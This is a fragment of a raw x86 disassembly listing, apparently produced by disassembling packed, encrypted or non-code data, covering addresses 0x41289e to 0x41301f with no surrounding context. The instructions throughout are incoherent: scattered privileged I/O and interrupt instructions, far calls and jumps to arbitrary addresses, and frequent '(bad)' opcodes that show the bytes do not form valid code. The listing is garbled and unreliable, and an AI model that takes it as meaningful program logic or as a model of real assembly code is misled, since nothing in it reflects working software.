  41289e:	xchg   BYTE PTR [edi+esi*8-0xf],bh
  4128a2:	or     al,0x90
  4128a4:	test   BYTE PTR [ebx+ebx*1],0xb4
  4128a8:	int3   
  4128a9:	imul   ebx,DWORD PTR [ebx+0x3e],0x38864300
  4128b0:	mov    ah,0x31
  4128b2:	sar    DWORD PTR [edx+0x3e],0x37
  4128b6:	push   edi
  4128b7:	aas    
  4128b8:	pusha  
  4128b9:	stos   DWORD PTR es:[edi],eax
  4128ba:	ins    BYTE PTR es:[edi],dx
  4128bb:	dec    esi
  4128bc:	mov    edx,0x4843532
  4128c1:	fcmovnu st,st(0)
  4128c3:	loope  0x412891
  4128c5:	pop    ecx
  4128c7:	push   0x5e
  4128c9:	pop    ss
  4128ca:	mov    eax,ds:0x198275de
  4128cf:	pop    esi
  4128d0:	cwde   
  4128d1:	lods   eax,DWORD PTR ds:[esi]
  4128d2:	xor    eax,0x69bf0871
  4128d7:	nop
  4128d8:	and    eax,0x1262e0b0
  4128dd:	cli    
  4128de:	xchg   DWORD PTR [esi],ebx
  4128e0:	cmp    BYTE PTR [edi+0x478ea6a4],bl
  4128e6:	scas   eax,DWORD PTR es:[edi]
  4128e7:	push   ecx
  4128e8:	jl     0x41290d
  4128ea:	jge    0x41294c
  4128ec:	add    DWORD PTR [esi+ebx*2],eax
  4128ef:	cmp    BYTE PTR [edx],bl
  4128f1:	xor    al,0xb6
  4128f3:	adc    al,0x57
  4128f5:	leave  
  4128f6:	cmp    al,0xf6
  4128f8:	lea    eax,[ebx-0xd4a359a]
  4128fe:	mov    eax,ds:0xa440d64e
  412903:	mov    edi,0xc3ce5cf9
  412908:	adc    BYTE PTR [ebp-0x7c8197ab],dl
  41290e:	dec    edx
  41290f:	push   esp
  412910:	push   esp
  412911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412912:	mul    BYTE PTR [ecx]
  412914:	xchg   edi,eax
  412915:	or     DWORD PTR [ebp-0x59],edi
  412918:	ja     0x412961
  41291a:	jle    0x41295e
  41291c:	cmp    al,ch
  41291e:	and    al,0x17
  412920:	sbb    bh,ah
  412922:	ficomp DWORD PTR [ebx+0x3f]
  412925:	jb     0x4128c5
  412927:	lds    ebx,FWORD PTR [ebp+0x5a]
  41292a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41292b:	cmp    BYTE PTR [ebx+0x32e6145f],dl
  412931:	or     edx,edx
  412933:	lods   al,BYTE PTR ds:[esi]
  412934:	sti    
  412935:	in     eax,0x80
  412937:	mov    edx,es
  412939:	add    edi,DWORD PTR [edi-0x7]
  41293c:	ja     0x4129bd
  41293e:	mov    ds:0x7e9638cf,al
  412943:	ret    0x2238
  412946:	jb     0x41294e
  412948:	inc    edi
  412949:	and    ebx,DWORD PTR [edi-0x1551b74]
  41294f:	hlt    
  412950:	xchg   ebx,eax
  412951:	sub    al,BYTE PTR [edi]
  412953:	rcr    BYTE PTR [edi-0x1c],0x8d
  412957:	sti    
  412958:	dec    esi
  412959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41295a:	in     eax,0xe5
  41295c:	mov    ds:0x6a87f91d,eax
  412961:	loope  0x41295c
  412963:	fwait
  412964:	pop    ebp
  412965:	fucomi st,st(7)
  412967:	arpl   dx,cx
  412969:	mov    edi,0x44523b7d
  41296e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41296f:	xchg   ebp,eax
  412970:	call   DWORD PTR [ecx+0xa]
  412973:	outs   dx,DWORD PTR ds:[esi]
  412974:	lea    esi,[edi+0x221638c2]
  41297a:	es mov al,0xcf
  41297d:	ret    
  41297e:	xor    BYTE PTR [esi+ebp*8-0xe9db0c4],dh
  412985:	inc    ebp
  412986:	adc    BYTE PTR [eax+0x12],cl
  412989:	inc    ebp
  41298a:	test   BYTE PTR [edx],cl
  41298c:	xor    BYTE PTR [ebp+0x24],dh
  41298f:	fdiv   st(7),st
  412991:	je     0x412a08
  412993:	push   0x444a1809
  412998:	pop    ss
  412999:	and    al,0x68
  41299b:	push   0x24f195ab
  4129a0:	mov    ebp,0xe1d6eb4d
  4129a5:	in     eax,dx
  4129a6:	add    edi,ebx
  4129a8:	push   esi
  4129a9:	mov    ah,0xa
  4129ab:	add    bh,ch
  4129ad:	push   esi
  4129ae:	ins    DWORD PTR es:[edi],dx
  4129af:	sub    al,0x56
  4129b1:	add    al,BYTE PTR [ebx-0x17]
  4129b4:	inc    ebx
  4129b5:	retf   0xf2be
  4129b8:	jge    0x4129b7
  4129ba:	fs adc al,0x3a
  4129bd:	sub    al,0x2f
  4129bf:	cdq    
  4129c0:	cs in  al,0xa9
  4129c3:	sbb    cl,dh
  4129c5:	jle    0x412a24
  4129c7:	mov    dl,0x88
  4129c9:	lahf   
  4129ca:	test   eax,0x122a7149
  4129cf:	sbb    al,0xe6
  4129d1:	aad    0xe2
  4129d3:	repnz std 
  4129d5:	nop
  4129d6:	fwait
  4129d7:	cmp    ah,BYTE PTR [eax+0x3f0e5a96]
  4129dd:	aad    0x1
  4129df:	adc    DWORD PTR [ebp-0x6c],edx
  4129e2:	mov    ebx,0x3d2a77b9
  4129e7:	push   edi
  4129e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129e9:	repz je 0x412a4f
  4129ec:	push   es
  4129ed:	push   ss
  4129ee:	adc    ebp,ebp
  4129f0:	lea    edi,[edi-0x6f]
  4129f3:	xchg   ebx,eax
  4129f4:	stc    
  4129f5:	cmp    DWORD PTR [ecx-0x34469fdd],ecx
  4129fb:	adc    eax,DWORD PTR [eax]
  4129fd:	cs int3 
  4129ff:	shl    DWORD PTR [edx-0x3d],cl
  412a02:	popa   
  412a03:	stos   DWORD PTR es:[edi],eax
  412a04:	xchg   edx,eax
  412a05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a06:	xor    BYTE PTR [edi+0xf],dl
  412a09:	sub    dh,BYTE PTR [edx]
  412a0b:	adc    DWORD PTR ds:0x420ea792,ebx
  412a11:	pop    ecx
  412a12:	clc    
  412a13:	js     0x4129af
  412a15:	jmp    0x20dfea0c
  412a1a:	(bad)  
  412a1b:	lahf   
  412a1c:	cmp    DWORD PTR [eax],esp
  412a1e:	cmp    DWORD PTR [edi+0x2f804260],eax
  412a24:	pushf  
  412a25:	push   esi
  412a26:	cmp    eax,0x3029fbf4
  412a2b:	cmp    esp,ebx
  412a2d:	call   0x791910ed
  412a32:	ret    
  412a33:	repnz xor ebx,0x8f35590c
  412a3a:	add    BYTE PTR [ebp+0x3e],bl
  412a3d:	pop    es
  412a3e:	mov    ch,0xcc
  412a40:	mov    ds:0x794bf653,al
  412a45:	push   esi
  412a46:	jbe    0x412a83
  412a48:	inc    eax
  412a49:	outs   dx,BYTE PTR ds:[esi]
  412a4a:	cli    
  412a4b:	pop    eax
  412a4c:	out    dx,eax
  412a4d:	outs   dx,BYTE PTR ds:[esi]
  412a4e:	repz sub BYTE PTR [esi+edi*2],dh
  412a52:	push   0x32c3429e
  412a57:	xchg   BYTE PTR [ecx-0x5239c1ca],dl
  412a5d:	call   0x7041:0x5a4bfb27
  412a64:	cmp    eax,0x9ff1b5e1
  412a69:	clc    
  412a6a:	jg     0x412aa7
  412a6c:	push   cs
  412a6d:	adc    DWORD PTR [bx+si-0x42dd],esp
  412a72:	dec    esp
  412a73:	lahf   
  412a74:	mov    ebp,0xa69a8d97
  412a79:	sbb    al,0x9f
  412a7b:	and    DWORD PTR [eax+0x6dbdd6e0],ebp
  412a81:	pop    edx
  412a82:	iret   
  412a83:	and    al,0xd4
  412a85:	(bad)  
  412a86:	pop    edi
  412a87:	jae    0x412abc
  412a89:	int    0xa4
  412a8b:	xchg   ebp,eax
  412a8c:	jl     0x412a1b
  412a8e:	mov    ebp,0xb4c02448
  412a93:	add    al,0xb5
  412a95:	sub    BYTE PTR [edx+0x75],bh
  412a98:	call   0x1249:0x7859042b
  412a9f:	inc    edi
  412aa0:	mov    esp,DWORD PTR [ebp+ebx*2-0x71]
  412aa4:	icebp  
  412aa5:	sbb    ebp,DWORD PTR [ecx]
  412aa7:	daa    
  412aa8:	(bad)  
  412aaa:	adc    DWORD PTR [eax-0x12b97c6],ecx
  412ab0:	jl     0x412a9a
  412ab2:	xor    eax,0x3e361a78
  412ab7:	ds jno 0x412ad5
  412aba:	repz pop eax
  412abc:	into   
  412abd:	icebp  
  412abe:	pop    eax
  412abf:	and    BYTE PTR [edi],bh
  412ac1:	mov    dh,0x6a
  412ac3:	in     eax,0x80
  412ac5:	ret    
  412ac6:	in     eax,0xbb
  412ac8:	mov    al,ds:0xc619fef8
  412ace:	mov    gs,WORD PTR [ecx+eiz*1]
  412ad1:	pushf  
  412ad2:	sbb    BYTE PTR [eax-0x22aef250],cl
  412ad8:	cmp    BYTE PTR [eax-0x1c],ch
  412adb:	mov    ds:0xea22580e,eax
  412ae0:	adc    eax,0x16352dfe
  412ae5:	sbb    dl,0xba
  412ae8:	pop    eax
  412ae9:	add    DWORD PTR [eax],edi
  412aeb:	sbb    eax,edx
  412aed:	pop    esp
  412aee:	mov    ch,0x56
  412af0:	(bad)  
  412af1:	aaa    
  412af2:	lods   al,BYTE PTR ds:[esi]
  412af3:	nop
  412af4:	or     DWORD PTR [ebp+0x4d6d0902],edx
  412afa:	cmp    BYTE PTR [esi+ebx*8+0x11],al
  412afe:	shl    ebx,cl
  412b00:	jne    0x412b19
  412b02:	xchg   ecx,eax
  412b03:	xchg   DWORD PTR [edi+ebx*8+0x72911da0],ebx
  412b0a:	mov    ah,0x6c
  412b0c:	xchg   esp,eax
  412b0d:	stc    
  412b0e:	mov    edi,0x9f213f49
  412b13:	(bad)  
  412b14:	pop    edx
  412b15:	hlt    
  412b16:	rcr    BYTE PTR [ebp+0x21146f8f],1
  412b1c:	cld    
  412b1d:	mov    dl,BYTE PTR [ebp-0x29ffcc4c]
  412b23:	arpl   WORD PTR [esi+edi*2],sp
  412b26:	mov    dl,0xa4
  412b28:	pop    ecx
  412b29:	(bad)  
  412b2a:	adc    dh,BYTE PTR [edx-0x47]
  412b2d:	mov    ebp,0x9fecd6a6
  412b32:	xchg   edi,eax
  412b33:	mov    ah,0xc2
  412b35:	es pop ebp
  412b37:	sub    esp,DWORD PTR [edx-0x30]
  412b3a:	lods   al,BYTE PTR ds:[esi]
  412b3b:	mov    dl,0xe1
  412b3d:	(bad)  
  412b3e:	je     0x412b58
  412b40:	mov    ecx,?
  412b42:	je     0x412ba7
  412b44:	shl    BYTE PTR [edi+0x34646ede],cl
  412b4a:	shl    BYTE PTR [eax],0x1a
  412b4d:	mov    bl,0x86
  412b4f:	pop    ebp
  412b50:	adc    eax,eax
  412b52:	test   DWORD PTR [esi-0x74],ebp
  412b55:	push   esp
  412b56:	mov    edx,0xa9f25cc3
  412b5b:	mov    dh,0x7b
  412b5d:	jle    0x412b17
  412b5f:	scas   al,BYTE PTR es:[edi]
  412b60:	sbb    bl,dl
  412b62:	inc    eax
  412b63:	jp     0x412b35
  412b65:	jns    0x412bac
  412b67:	add    esi,DWORD PTR [edx+0x1efea57b]
  412b6d:	xor    al,BYTE PTR ds:0xa71e47eb
  412b73:	xor    edx,DWORD PTR [edx]
  412b75:	repnz mov ds:0x6714c30f,al
  412b7b:	push   esi
  412b7c:	cmp    al,0xea
  412b7e:	sbb    eax,0x497f0eb2
  412b83:	mov    bh,0xde
  412b85:	idiv   edx
  412b87:	push   edx
  412b88:	cmp    ebx,esi
  412b8a:	pop    esp
  412b8b:	rcl    eax,1
  412b8d:	xor    esi,DWORD PTR [eax-0x4f]
  412b90:	jno    0x412bac
  412b92:	mov    ebx,0xfa73bd72
  412b97:	bnd call 0x9d8b2802
  412b9d:	push   edi
  412b9e:	mov    ebx,edx
  412ba0:	sbb    eax,0x314629ae
  412ba5:	jmp    FWORD PTR [eax]
  412ba7:	lds    ecx,FWORD PTR [eax-0x4c]
  412baa:	mov    al,0x26
  412bac:	mov    ch,0x1d
  412bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412baf:	add    ebx,eax
  412bb1:	cmp    BYTE PTR [edx+eiz*1+0xa],ch
  412bb5:	and    BYTE PTR [edi-0x19763cc8],0x99
  412bbc:	in     al,0x25
  412bbe:	adc    al,0x16
  412bc0:	cmp    eax,0x343104c2
  412bc5:	ret    0x76cf
  412bc8:	leave  
  412bc9:	shl    ebp,cl
  412bcb:	sbb    dh,al
  412bcd:	push   0xfffffffb
  412bcf:	scas   al,BYTE PTR es:[edi]
  412bd0:	sar    DWORD PTR [edi],0xeb
  412bd3:	cdq    
  412bd4:	(bad)  
  412bd6:	addr16 mov dh,0xc3
  412bd9:	shl    DWORD PTR [edi+0x316dc42d],0xcf
  412be0:	sbb    BYTE PTR [ecx+0x3521b42c],0x69
  412be7:	ret    0x58f2
  412bea:	add    DWORD PTR [esi-0x5e],ebp
  412bed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bee:	retf   
  412bef:	cmp    eax,0x514c5eb5
  412bf4:	pop    ebp
  412bf5:	mov    al,0x2b
  412bf7:	mov    ebp,0x620e4e84
  412bfc:	dec    ebx
  412bfd:	inc    esi
  412bfe:	jmp    0x381ac174
  412c03:	mov    BYTE PTR [edx],bh
  412c05:	popf   
  412c06:	ins    BYTE PTR es:[edi],dx
  412c07:	std    
  412c08:	pop    eax
  412c09:	or     DWORD PTR [ebx],ebx
  412c0b:	repnz xor al,0xb4
  412c0e:	add    eax,0xcc740b7e
  412c13:	mov    edi,0x507526fe
  412c18:	jmp    0x412c88
  412c1a:	(bad)  
  412c1c:	xchg   ecx,eax
  412c1d:	xchg   edx,eax
  412c1e:	fdivr  st(3),st
  412c20:	fdivr  st,st(1)
  412c22:	mov    DWORD PTR [eax],esi
  412c24:	test   eax,0x7a75d4d5
  412c29:	adc    DWORD PTR [edx-0x2fc4789d],0xffffffb2
  412c30:	icebp  
  412c31:	or     DWORD PTR [edi+0x59],esp
  412c34:	out    dx,al
  412c35:	inc    edi
  412c36:	lahf   
  412c37:	xor    BYTE PTR [ebx],al
  412c39:	cmp    ah,BYTE PTR [edx]
  412c3b:	les    eax,FWORD PTR [eax]
  412c3d:	pop    edi
  412c3e:	pop    eax
  412c3f:	imul   eax,DWORD PTR [edx+0x4c03cb71],0x98b6f179
  412c49:	and    eax,0x3492d391
  412c4e:	test   eax,0xd0a3888c
  412c53:	jne    0x412c24
  412c55:	xor    ch,BYTE PTR [esi-0x6c]
  412c58:	xchg   esi,eax
  412c59:	lods   al,BYTE PTR ds:[esi]
  412c5a:	rcl    DWORD PTR [bx+di],1
  412c5d:	cli    
  412c5e:	stc    
  412c5f:	push   edi
  412c60:	in     eax,dx
  412c61:	fild   WORD PTR [edx]
  412c63:	popa   
  412c64:	out    dx,eax
  412c65:	mov    BYTE PTR [edi+0x36],dh
  412c68:	jl     0x412ca1
  412c6a:	adc    DWORD PTR [ebx*2-0x9ba22c9],eax
  412c71:	ja     0x412ce4
  412c73:	inc    ecx
  412c74:	mov    al,0xce
  412c76:	fdivr  DWORD PTR [esi+0x67]
  412c79:	aaa    
  412c7a:	pop    es
  412c7b:	pop    es
  412c7c:	push   ecx
  412c7d:	popf   
  412c7e:	jl     0x412cab
  412c80:	xchg   esi,eax
  412c81:	mov    ebx,0x31a0b12e
  412c86:	xor    ecx,ebx
  412c88:	push   edx
  412c89:	xor    eax,DWORD PTR [esp+edi*1+0x455af555]
  412c90:	into   
  412c91:	ins    DWORD PTR es:[edi],dx
  412c92:	(bad)  
  412c93:	push   ss
  412c94:	mov    ebx,0x92e2b74a
  412c99:	sub    BYTE PTR [edi],bh
  412c9b:	int    0xbf
  412c9d:	mov    eax,0xb014b46
  412ca2:	lods   eax,DWORD PTR ds:[esi]
  412ca3:	pop    ebx
  412ca4:	das    
  412ca5:	fld    QWORD PTR es:[ebx+0x51]
  412ca9:	dec    esp
  412caa:	jns    0x412cd4
  412cac:	in     eax,0x97
  412cae:	(bad)  
  412caf:	loopne 0x412c79
  412cb1:	jecxz  0x412c7b
  412cb3:	or     ch,BYTE PTR [ebx+edi*1+0x11]
  412cb7:	gs mov al,0x36
  412cba:	in     eax,0x8e
  412cbc:	lock add BYTE PTR cs:[esi-0x4497f7e9],dh
  412cc4:	xor    BYTE PTR [ebx-0x2c],al
  412cc7:	xor    DWORD PTR [ecx],edi
  412cc9:	fs push ds
  412ccb:	pushw  0xffa2
  412cce:	rcr    DWORD PTR [ebx],0x59
  412cd1:	jns    0x412cbb
  412cd3:	lds    ebx,FWORD PTR [edi+0x32]
  412cd6:	(bad)  
  412cd9:	aaa    
  412cda:	inc    edx
  412cdb:	daa    
  412cdc:	into   
  412cdd:	cmc    
  412cde:	or     eax,0xb03dc60c
  412ce3:	shl    BYTE PTR [ebp-0x9959b9b],1
  412ce9:	(bad)  
  412cea:	je     0x412d0b
  412cec:	bound  esi,QWORD PTR [ebx+ebx*1+0x40f4f3e]
  412cf3:	xchg   esp,eax
  412cf4:	xchg   DWORD PTR [eax+0x75],edx
  412cf7:	fimul  WORD PTR [ecx+eiz*4-0x3a]
  412cfb:	js     0x412d62
  412cfd:	xchg   ebp,eax
  412cfe:	jae    0x412d50
  412d00:	jg     0x412d81
  412d02:	(bad)  
  412d03:	ins    BYTE PTR es:[edi],dx
  412d04:	outs   dx,DWORD PTR ss:[esi]
  412d06:	stos   DWORD PTR es:[edi],eax
  412d07:	js     0x412d06
  412d09:	pushf  
  412d0a:	jne    0x412ca9
  412d0c:	inc    esp
  412d0d:	shl    BYTE PTR [eax-0x38022211],0x6b
  412d14:	xor    eax,DWORD PTR [edx]
  412d16:	xor    dh,ah
  412d18:	mov    ecx,0x5b023d7f
  412d1d:	ja     0x412d2a
  412d1f:	add    al,0xd1
  412d21:	mov    ch,0x42
  412d23:	mov    ah,BYTE PTR [ebx-0x69]
  412d26:	sub    BYTE PTR [edx],bh
  412d28:	jnp    0x412d9b
  412d2a:	jbe    0x412da0
  412d2c:	add    eax,DWORD PTR [eax+esi*2+0x3d]
  412d30:	xchg   BYTE PTR [ebp-0x1b],ch
  412d33:	mov    al,0xab
  412d35:	add    dl,cl
  412d37:	in     al,dx
  412d38:	gs mov edi,0x66b919c3
  412d3e:	int    0x70
  412d40:	xchg   ebp,eax
  412d41:	adc    al,0xfb
  412d43:	cmc    
  412d44:	sbb    eax,0xc71896db
  412d49:	sub    DWORD PTR ds:0xcc17b05,edx
  412d4f:	sub    cl,BYTE PTR es:[eax-0x2b]
  412d53:	xor    BYTE PTR [esi],cl
  412d55:	call   DWORD PTR [esp+esi*1+0x7ca53a53]
  412d5c:	popf   
  412d5d:	int    0xfc
  412d5f:	dec    ebp
  412d60:	mov    ecx,0x72d55ede
  412d65:	test   DWORD PTR es:[ecx],ebp
  412d68:	xchg   edx,eax
  412d69:	inc    eax
  412d6a:	cdq    
  412d6b:	xor    al,0xf6
  412d6d:	mov    esp,0x52056ae8
  412d72:	xor    ebx,0x38
  412d75:	popf   
  412d76:	out    0x10,al
  412d78:	scas   al,BYTE PTR es:[edi]
  412d79:	push   edi
  412d7a:	(bad)  
  412d7b:	ins    BYTE PTR es:[edi],dx
  412d7c:	fild   QWORD PTR [edi+0x35c2c5e2]
  412d82:	icebp  
  412d83:	add    ecx,ebp
  412d85:	push   esp
  412d86:	push   ecx
  412d87:	jo     0x412dcd
  412d89:	cdq    
  412d8a:	cmp    eax,DWORD PTR [ebp-0x91b140f]
  412d90:	mov    dl,0x9
  412d92:	or     BYTE PTR [esi-0x581eb3a],bh
  412d98:	std    
  412d99:	push   ecx
  412d9a:	add    dl,BYTE PTR [ebx]
  412d9c:	scas   eax,DWORD PTR es:[edi]
  412d9d:	cli    
  412d9e:	push   edx
  412d9f:	gs fs jb 0x412d5a
  412da3:	fcomip st,st(1)
  412da5:	ins    DWORD PTR es:[edi],dx
  412da6:	stos   BYTE PTR es:[edi],al
  412da7:	loop   0x412db9
  412da9:	jmp    0x412d35
  412dab:	add    al,0x75
  412dad:	push   ebp
  412dae:	test   al,0x11
  412db0:	mov    edi,0xe85f37ab
  412db5:	xchg   ebx,eax
  412db6:	(bad)  
  412db7:	out    dx,eax
  412db8:	mov    ds:0xf06a2941,eax
  412dbd:	jmp    0x27ca7040
  412dc2:	shr    DWORD PTR [ebx-0x4b],cl
  412dc5:	iret   
  412dc6:	jb     0x412d84
  412dc8:	ret    0x860b
  412dcb:	and    BYTE PTR ds:0x94680661,ah
  412dd1:	cmc    
  412dd2:	push   edi
  412dd3:	mov    DWORD PTR [edi-0x55ea06d9],edi
  412dd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dda:	add    esp,esp
  412ddc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ddd:	in     al,dx
  412dde:	fsub   st(5),st
  412de0:	in     al,dx
  412de1:	mov    bh,0xcb
  412de3:	sbb    eax,0xa7237c99
  412de8:	lods   al,BYTE PTR ds:[esi]
  412de9:	jge    0x412e44
  412deb:	aam    0x22
  412ded:	(bad)  
  412dee:	cmp    edx,DWORD PTR [bx+di+0x4e4]
  412df3:	and    edi,ebp
  412df5:	adc    BYTE PTR [eax-0x80],bl
  412df8:	adc    dl,0xc0
  412dfb:	dec    ebp
  412dfc:	in     al,0xbb
  412dfe:	std    
  412dff:	cwde   
  412e00:	jg     0x412d89
  412e02:	repnz test BYTE PTR [ebp+0x24],dh
  412e06:	mov    esi,0xf1b1b3de
  412e0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e0c:	add    DWORD PTR [edx+0x38],esi
  412e0f:	jno    0x412de1
  412e11:	and    al,0xb8
  412e13:	jne    0x412d9b
  412e15:	jbe    0x412db9
  412e17:	pop    es
  412e18:	and    ecx,DWORD PTR [edx+0x20c64207]
  412e1e:	mov    cl,bl
  412e20:	mov    edx,0x7b8ce54d
  412e25:	inc    edi
  412e26:	inc    ebp
  412e27:	ja     0x412e4a
  412e29:	outs   dx,BYTE PTR ds:[esi]
  412e2a:	inc    ebp
  412e2b:	inc    esi
  412e2c:	cmp    al,0x3a
  412e2e:	(bad)  
  412e2f:	std    
  412e30:	or     dh,dh
  412e32:	jle    0x412e5e
  412e34:	fld    QWORD PTR [ecx]
  412e36:	and    eax,0xde8575cb
  412e3b:	clc    
  412e3c:	and    edi,esi
  412e3e:	pop    edi
  412e3f:	arpl   WORD PTR [ebx-0x6],dx
  412e42:	jmp    0x412e9f
  412e44:	pop    edx
  412e45:	in     al,dx
  412e46:	xor    BYTE PTR [edi-0x60a61be8],ch
  412e4c:	xor    al,0xa8
  412e4e:	jns    0x412e1b
  412e50:	jno    0x412dde
  412e52:	sahf   
  412e53:	xor    BYTE PTR [edi+edx*1+0x6],ch
  412e57:	(bad)  
  412e58:	ja     0x412ed1
  412e5a:	test   DWORD PTR [ebx-0x49252704],esi
  412e60:	jno    0x412ed0
  412e62:	fcomp  st(6)
  412e64:	icebp  
  412e65:	and    edi,DWORD PTR [eax]
  412e67:	popf   
  412e68:	jecxz  0x412eaa
  412e6a:	test   al,0x7f
  412e6c:	jo     0x412e3f
  412e6e:	mov    ah,BYTE PTR [ecx-0x16060e7]
  412e74:	cld    
  412e75:	lods   eax,DWORD PTR ds:[esi]
  412e77:	data16 cld 
  412e79:	sub    BYTE PTR [eax-0xaf5e918],ch
  412e7f:	mov    bh,0xb0
  412e81:	(bad)  
  412e82:	adc    eax,0xd314c339
  412e87:	ins    DWORD PTR es:[edi],dx
  412e88:	jmp    0x412ef9
  412e8a:	lahf   
  412e8b:	repz leave 
  412e8d:	retfw  0xc1c5
  412e91:	(bad)  
  412e94:	call   0x2ab3:0x498a85b7
  412e9b:	or     al,0x27
  412e9d:	xor    dh,BYTE PTR [ebp-0x1c]
  412ea0:	jbe    0x412e9b
  412ea2:	cmp    al,0xb1
  412ea4:	scas   al,BYTE PTR es:[edi]
  412ea5:	aam    0x8b
  412ea7:	es pop ebx
  412ea9:	sbb    al,BYTE PTR [edi]
  412eab:	jns    0x412e30
  412ead:	sar    DWORD PTR [edi],cl
  412eaf:	jp     0x412e84
  412eb1:	aad    0x8a
  412eb3:	shr    DWORD PTR [esi],0xe6
  412eb6:	mov    dh,0x89
  412eb8:	cmp    BYTE PTR [ebp+0x40],dl
  412ebb:	ins    BYTE PTR es:[edi],dx
  412ebc:	sub    DWORD PTR [edx-0x75],0xffffffe8
  412ec0:	jmp    0x412e53
  412ec2:	lods   eax,DWORD PTR ds:[esi]
  412ec3:	fiadd  WORD PTR [eax+0x651d1d78]
  412ec9:	cld    
  412eca:	stos   DWORD PTR es:[edi],eax
  412ecb:	mov    ecx,0x35a3ec5f
  412ed0:	addr16 push esp
  412ed2:	mov    ebx,0x88b45e8f
  412ed7:	shl    DWORD PTR [esi+0x1bdd78cc],1
  412edd:	xchg   BYTE PTR [ebp-0x48],al
  412ee0:	adc    al,0xa9
  412ee2:	ss push ebp
  412ee4:	and    BYTE PTR [ecx],0x9f
  412ee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ee8:	dec    eax
  412ee9:	gs sub eax,0x3c257205
  412eef:	adc    BYTE PTR [ebx+ebp*4-0x58fe85b5],cl
  412ef6:	hlt    
  412ef7:	xchg   cl,ch
  412ef9:	daa    
  412efa:	cmp    al,0x55
  412efc:	lock jnp 0x412ea1
  412eff:	out    0x3a,al
  412f01:	icebp  
  412f02:	dec    esp
  412f03:	jae    0x412ec4
  412f05:	mov    eax,DWORD PTR [esi+eax*8-0x60]
  412f09:	(bad)  
  412f0a:	jns    0x412f6d
  412f0c:	cmp    esi,eax
  412f0e:	lahf   
  412f0f:	push   esi
  412f10:	sbb    BYTE PTR [ebx],dl
  412f12:	sub    DWORD PTR [ebx+esi*1+0x72d19766],edi
  412f19:	and    eax,0xc519c28d
  412f1e:	rcl    ebx,cl
  412f20:	dec    ebx
  412f21:	xchg   edi,eax
  412f22:	add    ah,BYTE PTR [ebp+eax*4-0x4f507b85]
  412f29:	jle    0x412f67
  412f2b:	dec    ecx
  412f2c:	cdq    
  412f2d:	rcr    DWORD PTR ds:0xcee22ca5,cl
  412f33:	mov    gs:0x2cd7c987,eax
  412f39:	call   0x2ea166ba
  412f3e:	pop    edi
  412f3f:	lock icebp 
  412f41:	sub    ebx,edx
  412f43:	hlt    
  412f44:	mov    ds:0xa4d2f4cb,al
  412f49:	jns    0x412eea
  412f4b:	mov    al,ds:0xe1c4b37e
  412f50:	and    cl,BYTE PTR [eax]
  412f52:	mov    eax,ds:0xade04276
  412f57:	cwde   
  412f58:	or     eax,0x5393ece9
  412f5d:	push   es
  412f5e:	ins    DWORD PTR es:[edi],dx
  412f5f:	xor    DWORD PTR [ebx+0x798ee8f2],eax
  412f65:	or     DWORD PTR [esi-0x5ed5e6d6],ebx
  412f6b:	int    0x63
  412f6d:	ins    DWORD PTR es:[edi],dx
  412f6e:	jno    0x412fc8
  412f70:	stc    
  412f71:	mov    dh,0x36
  412f73:	cmp    ecx,DWORD PTR [eax]
  412f75:	push   0x25
  412f77:	mov    WORD PTR [edi-0x34],ds
  412f7a:	retf   0xb074
  412f7d:	mov    WORD PTR [edi],es
  412f7f:	mul    BYTE PTR [eax+0x4b2bf50a]
  412f85:	jl     0x412fa6
  412f87:	gs xchg esp,ecx
  412f8a:	cmp    BYTE PTR [ecx+0xbef33b],bl
  412f90:	dec    ebp
  412f91:	push   DWORD PTR [edi]
  412f93:	sbb    eax,0x71a6a2c7
  412f98:	mov    ebp,0x7ef6ed50
  412f9d:	(bad)  
  412f9e:	out    dx,eax
  412f9f:	inc    edi
  412fa0:	rcl    DWORD PTR [edi+eiz*8+0x59c6e106],1
  412fa7:	cdq    
  412fa8:	mov    ds:0x12c21a3e,eax
  412fad:	or     al,dl
  412faf:	loopne 0x412f9a
  412fb1:	stos   DWORD PTR es:[edi],eax
  412fb2:	push   esp
  412fb3:	lds    ecx,FWORD PTR [eax-0xd]
  412fb6:	neg    DWORD PTR [edi+0x42]
  412fb9:	jge    0x412f9d
  412fbb:	dec    edi
  412fbc:	dec    esi
  412fbd:	inc    ebp
  412fbe:	xchg   ecx,eax
  412fbf:	data16 or al,0x6a
  412fc2:	add    al,bl
  412fc4:	or     DWORD PTR [ebp+0x5f],ecx
  412fc7:	inc    ebx
  412fc8:	(bad)  
  412fc9:	xor    bl,BYTE PTR [esi]
  412fcb:	out    0x74,eax
  412fcd:	stos   DWORD PTR es:[edi],eax
  412fce:	arpl   WORD PTR [esi-0x31971929],bx
  412fd4:	lahf   
  412fd5:	call   0xcf3a:0x8ef0f717
  412fdc:	ss cld 
  412fde:	into   
  412fdf:	jnp    0x412ffa
  412fe1:	out    dx,eax
  412fe2:	xchg   BYTE PTR [edx-0x5fd241a9],ah
  412fe8:	pop    edx
  412fe9:	or     al,ah
  412feb:	stos   BYTE PTR es:[edi],al
  412fec:	dec    ebx
  412fed:	aas    
  412fee:	ins    BYTE PTR es:[edi],dx
  412fef:	mov    al,ds:0x4554bd7d
  412ff4:	pop    ecx
  412ff5:	ret    0x6157
  412ff8:	shl    BYTE PTR [ebx-0x2aceacc],1
  412ffe:	sti    
  412fff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413000:	ins    DWORD PTR es:[edi],dx
  413001:	jmp    0x41304b
  413003:	fisttp DWORD PTR [ebp-0x1d]
  413006:	pop    edi
  413007:	scas   al,BYTE PTR es:[edi]
  413008:	jl     0x412fb2
  41300a:	sbb    eax,0x19111121
  41300f:	cmp    BYTE PTR [ecx-0x329fa36e],bh
  413015:	or     bl,BYTE PTR [esi]
  413017:	jae    0x412fd8
  413019:	out    0x4a,al
  41301b:	pop    ss
  41301c:	jmp    0x413010
  41301e:	push   esp
  41301f:	popf   
